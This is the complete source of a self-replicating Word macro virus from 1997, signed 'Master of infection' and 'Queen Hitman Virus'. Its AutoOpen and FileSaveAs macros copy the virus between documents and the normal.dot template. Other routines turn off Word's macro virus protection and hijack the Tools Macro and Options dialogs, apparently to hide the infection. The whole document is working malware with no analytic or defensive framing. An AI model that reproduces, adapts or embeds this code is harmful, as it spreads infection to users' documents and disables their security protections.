   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsOptions"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Changes various categories of Word for Windows options"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsOptions.MAIN"
   Dim false_
   Dim dlgGeneral

   WordBasic.DisableAutoMacros 0

   WordBasic.MsgBox "(c) 1997 Master of infection"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.WW7_ToolsOptions(False)
   WordBasic.CurValues.WW7_ToolsOptions dlg
   On Error Goto -1 : On Error Goto err.Number
   WordBasic.Dialog.WW7_ToolsOptions dlg
   WordBasic.WW7_ToolsOptions dlg
   WordBasic.ToolsOptionsGeneral VirusProtection:=false_
   WordBasic.ToolsOptionsGeneral dlgGeneral
   Err.Number:
   End Sub

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   'Delete ALL REM!

   WordBasic.DisableAutoMacros 0

   WordBasic.MsgBox "(c) 1997 Master of infection"
   Rem goto oblom
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
   WordBasic.CurValues.ToolsMacro dlg
   On Error GoTo -1: On Error GoTo oblom
   WordBasic.Dialog.ToolsMacro dlg
   WordBasic.ToolsMacro dlg
   oblom:
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim nn$
   Dim namef$
   Dim named$
   Dim namefa$
   Dim nameda$
   Dim namefb$
   Dim namedb$
   Dim namefc$
   Dim namedc$
   Dim namefd$
   Dim namedd$
   '(c) 1997 Master of Infection
   'QUEEN FOREVER!!!

   WordBasic.DisableAutoMacros 0

   Dim n As Object: Set n = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs n
   On Error Goto -1 : On Error Goto err.Number
   WordBasic.Dialog.FileSaveAs n
   If n.Format <> 1 Then n.Format = 1

   nn$ = WordBasic.[DefaultDir$](2) + "/normal.dot"
   namef$ = WordBasic.[FileName$]() + ":AutoOpen"
   named$ = nn$ + ":AutoOpen"
   namefa$ = WordBasic.[FileName$]() + ":FileSaveAs"
   nameda$ = nn$ + ":FileSaveAs"
   namefb$ = WordBasic.[FileName$]() + ":ToolsMacro"
   namedb$ = nn$ + ":ToolsMacro"
   namefc$ = WordBasic.[FileName$]() + ":ToolsOptions"
   namedc$ = nn$ + ":ToolsOptions"
   namefd$ = WordBasic.[FileName$]() + ":AutoExec"
   namedd$ = nn$ + ":AutoExec"


   WordBasic.MacroCopy nameda$, namefa$  ', - 1  Delete "'" to close Macro!
   WordBasic.MacroCopy named$, namef$  ', - 1 -------------||----------
   WordBasic.MacroCopy namedb$, namefb$  ', - 1 -------------||----------
   WordBasic.MacroCopy namedc$, namefc$  ', - 1 -------------||----------
   WordBasic.MacroCopy namedd$, namefd$  ', - 1 -------------||----------

   WordBasic.FileSaveAs n
   On Error Goto -1 : On Error Goto err.Number
   Err.Number:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "(c) 1997 Master of infection...   QUEEN FOREVER!!!\r\nDedicated to the immortal spirit of Freddie Mecrury!!!"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim nn$
   Dim namef$
   Dim named$
   Dim namefa$
   Dim nameda$
   Dim namefb$
   Dim namedb$
   Dim namefc$
   Dim namedc$
   Dim namefd$
   Dim namedd$
   Dim iMacroCount
   Dim i
   Dim bIf
   Dim bIs
   Dim bIt
   Dim bIi
   Dim bIa
   Dim n As Object
   '         :)
   '(c) 1997 Master of Infection
   'QUEEN FOREVER!!!

   WordBasic.DisableAutoMacros 0

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsOptionsGeneral(False)
   WordBasic.CurValues.ToolsOptionsGeneral dlg
   On Error GoTo -1: On Error GoTo continue
   On Error GoTo -1: On Error GoTo continue
   WordBasic.ToolsOptionsGeneral dlg
   continue:

   nn$ = WordBasic.[DefaultDir$](2) + "/normal.dot"

   namef$ = WordBasic.[FileName$]() + ":AutoOpen"
   named$ = nn$ + ":AutoOpen"
   namefa$ = WordBasic.[FileName$]() + ":FileSaveAs"
   nameda$ = nn$ + ":FileSaveAs"
   namefb$ = WordBasic.[FileName$]() + ":ToolsMacro"
   namedb$ = nn$ + ":ToolsMacro"
   namefc$ = WordBasic.[FileName$]() + ":ToolsOptions"
   namedc$ = nn$ + ":ToolsOptions"
   namefd$ = WordBasic.[FileName$]() + ":AutoExec"
   namedd$ = nn$ + ":AutoExec"


   On Error Goto -1 : On Error Goto err.Number
       iMacroCount = WordBasic.CountMacros(0, 0)
       For i = 1 To iMacroCount
           If WordBasic.[MacroName$](i, 0, 0) = "AutoOpen" Then
               bIf = -1
           End If
           If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
               bIs = -1
           End If
           If WordBasic.[MacroName$](i, 0, 0) = "ToolsMacro" Then
               bIt = -1
           End If
           If WordBasic.[MacroName$](i, 0, 0) = "ToolsOptions" Then
               bIi = -1
           End If
           If WordBasic.[MacroName$](i, 0, 0) = "AutoExec" Then
               bIa = -1
           End If
       Next i
       If Not bIf Or Not bIs Or Not bIt Or Not bIi Or Not bIa Then

   WordBasic.MacroCopy namefa$, nameda$   ', - 1 Delete "'" to close Macro!
   WordBasic.MacroCopy namef$, named$
   WordBasic.MacroCopy namefb$, namedb$
   WordBasic.MacroCopy namefc$, namedc$
   WordBasic.MacroCopy namefd$, namedd$

   Goto err.Number
   End If

   iMacroCount = WordBasic.CountMacros(1, 0)
       For i = 1 To iMacroCount
           If WordBasic.[MacroName$](i, 1, 0) = "AutoOpen" Then
               bIf = -1
           End If
           If WordBasic.[MacroName$](i, 1, 0) = "FileSaveAs" Then
               bIs = -1
           End If
           If WordBasic.[MacroName$](i, 1, 0) = "ToolsMacro" Then
               bIt = -1
           End If
           If WordBasic.[MacroName$](i, 1, 0) = "ToolsOptions" Then
               bIi = -1
           End If
           If WordBasic.[MacroName$](i, 1, 0) = "AutoExec" Then
               bIa = -1
           End If
       Next i
       If Not bIf Or Not bIs Or Not bIt Or Not bIi Or Not bIa Then

   Set n = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs n
   n.Format = 1

   WordBasic.MacroCopy nameda$, namefa$
   WordBasic.MacroCopy named$, namef$
   WordBasic.MacroCopy namedb$, namefb$
   WordBasic.MacroCopy namedc$, namefc$
   WordBasic.MacroCopy namedd$, namefd$

   WordBasic.FileSaveAs n
   End If
   Err.Number:
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   '(c) 1997 Master of infection
   'F##k up for the macro-antiviruses! ;)
   'Queen Hitman Virus inc.

   WordBasic.DisableAutoMacros 0

   End Sub
